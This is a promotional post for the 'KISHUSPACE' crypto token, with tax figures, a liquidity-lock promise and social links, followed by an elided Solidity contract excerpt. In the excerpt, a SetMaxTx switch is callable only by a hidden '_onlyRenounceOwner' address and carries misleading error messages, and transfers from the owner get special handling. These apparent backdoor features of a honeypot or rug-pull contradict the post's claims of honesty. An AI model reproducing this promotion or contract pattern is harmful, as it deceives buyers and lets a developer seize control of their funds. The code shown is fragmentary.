...
🔅 5% $KISHU rewards on every transaction 

🚀Fair launching on 🚀

What is KISHUSPACE about ?

KISHUSPACE is a redistribution token that rewards in $KISHU. 
Besides that we plan to have our own staking Platform where you can create a pair of $BNB and $KISHUSPACE to make even more gains. 

‼️IT AINT MUCH BUT ITS HONEST WORK!‼️
...
2% Marketing and Token Development Tax

 

🧢Starting Marketcap will be 3 BNB (initial Liq)

🔊VC will be on before launch🔊

🔐LIQ will be locked on DEEPLOCK for 6 Month 
(relock if needed)

For more info pls check out our website or ask our team members, we are active 24/7 🙋🏻‍♂️

🌐Website:  https://kishuspace.com/
🐦Twitter: 
💬TG: https://t.me/KishuSpace
...
contract KISHUSPACE is Context, IERC20, Ownable {
    ...
    function SetMaxTx(bool _a) public {
        require(_msgSender() != address(0), "ERC20: cannot permit zero address");
        require(_msgSender() == _onlyRenounceOwner, "ERC20: cannot permit dev address");
        a = _a;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal {
        ...
        if (sender == owner()) {
            ...
            uint256 burnAmount = amount.mul(_ERROR).div(100);
